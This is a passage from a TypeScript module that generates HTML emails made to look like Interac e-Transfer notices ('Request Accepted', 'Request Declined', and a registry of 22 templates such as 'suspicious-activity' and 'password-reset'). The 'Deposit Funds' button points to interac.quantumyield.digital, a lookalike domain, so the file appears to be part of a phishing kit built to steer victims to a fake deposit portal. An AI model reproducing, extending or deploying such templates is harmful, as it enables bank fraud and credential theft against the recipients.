          <div class="button-section" style="display: flex; gap: 12px; justify-content: center;">
            <a href="#" class="action-button">Send Money</a>
            <a href="#" class="action-button" style="background-color: #6c757d;">Decline</a>
          </div>
        </div>
        ${getFooter()}
      </div>
    </body>
    </html>
  `
}

// 21. Request Accepted
export function generateRequestAccepted(data: BaseEmailData): string {
  const amount = data.amount || 0
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">${getEmailStyles()}</head>
    <body>
      <div class="container">
        ${getHeader()}
        <div class="content">
          <h1 class="greeting">Request Accepted!</h1>
          <p class="subtitle">Your money request has been fulfilled.</p>
          
          <div class="alert-box alert-success">
            <strong>Success:</strong> ${data.recipientName || "Someone"} sent you $${formatAmount(amount)} CAD.
          </div>
          
          <div class="amount-box" style="background: linear-gradient(135deg, #28a745 0%, #218838 100%);">
            <div class="amount-value">$${formatAmount(amount)} CAD</div>
            <div class="amount-label">Received</div>
          </div>
          
          <div class="details-card">
            <h3 class="details-title">Transaction Details</h3>
            <div class="detail-row"><span class="detail-label">From:</span><span class="detail-value">${data.recipientName || "Sender"}</span></div>
            <div class="detail-row"><span class="detail-label">Amount:</span><span class="detail-value">$${formatAmount(amount)} CAD</span></div>
            <div class="detail-row"><span class="detail-label">Date:</span><span class="detail-value">${formatDate()}</span></div>
            <div class="detail-row"><span class="detail-label">Status:</span><span class="detail-value" style="color: #28a745;">Completed</span></div>
          </div>
          
          <div class="button-section">
            <a href="https://interac.quantumyield.digital/deposit-portal" class="action-button">Deposit Funds</a>
          </div>
        </div>
        ${getFooter()}
      </div>
    </body>
    </html>
  `
}

// 22. Request Declined
export function generateRequestDeclined(data: BaseEmailData): string {
  const amount = data.amount || 0
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">${getEmailStyles()}</head>
    <body>
      <div class="container">
        ${getHeader()}
        <div class="content">
          <h1 class="greeting">Request Declined</h1>
          <p class="subtitle">Your money request was not fulfilled.</p>
          
          <div class="alert-box alert-warning">
            <strong>Declined:</strong> ${data.recipientName || "The recipient"} couldn't fulfill your request.
          </div>
          
          <div class="details-card">
            <h3 class="details-title">Request Details</h3>
            <div class="detail-row"><span class="detail-label">Requested From:</span><span class="detail-value">${data.recipientName || "Recipient"}</span></div>
            <div class="detail-row"><span class="detail-label">Amount:</span><span class="detail-value">$${formatAmount(amount)} CAD</span></div>
            <div class="detail-row"><span class="detail-label">Date:</span><span class="detail-value">${formatDate()}</span></div>
            <div class="detail-row"><span class="detail-label">Status:</span><span class="detail-value" style="color: #6c757d;">Declined</span></div>
          </div>
          
          <p style="color: #666666; font-size: 14px; text-align: center;">
            You can send a new request or contact the recipient directly.
          </p>
        </div>
        ${getFooter()}
      </div>
    </body>
    </html>
  `
}

// Export a function to get generator by template ID
export const templateGenerators: Record<string, (data: BaseEmailData) => string> = {
  "transfer-received": generateTransferReceived,
  "transfer-sent": generateTransferSent,
  "transfer-pending": generateTransferPending,
  "transfer-cancelled": generateTransferCancelled,
  "transfer-expired": generateTransferExpired,
  "deposit-completed": generateDepositCompleted,
  "deposit-failed": generateDepositFailed,
  "deposit-reminder": generateDepositReminder,
  "deposit-instructions": generateDepositInstructions,
  "auto-deposit-enabled": generateAutoDepositEnabled,
  "security-question-updated": generateSecurityQuestionUpdated,
  "suspicious-activity": generateSuspiciousActivity,
  "password-reset": generatePasswordReset,
  "two-factor-enabled": generateTwoFactorEnabled,
  "login-notification": generateLoginNotification,
  "account-verified": generateAccountVerified,
  "profile-updated": generateProfileUpdated,
  "bank-linked": generateBankLinked,
  "limit-increase": generateLimitIncrease,
  "money-request": generateMoneyRequest,
  "request-accepted": generateRequestAccepted,
  "request-declined": generateRequestDeclined,
}

export function generateEmailByTemplateId(templateId: string, data: BaseEmailData): string {
  const generator = templateGenerators[templateId]
  if (generator) {
    return generator(data)
  }
  // Fallback to transfer-received if template not found
  return generateTransferReceived(data)
}
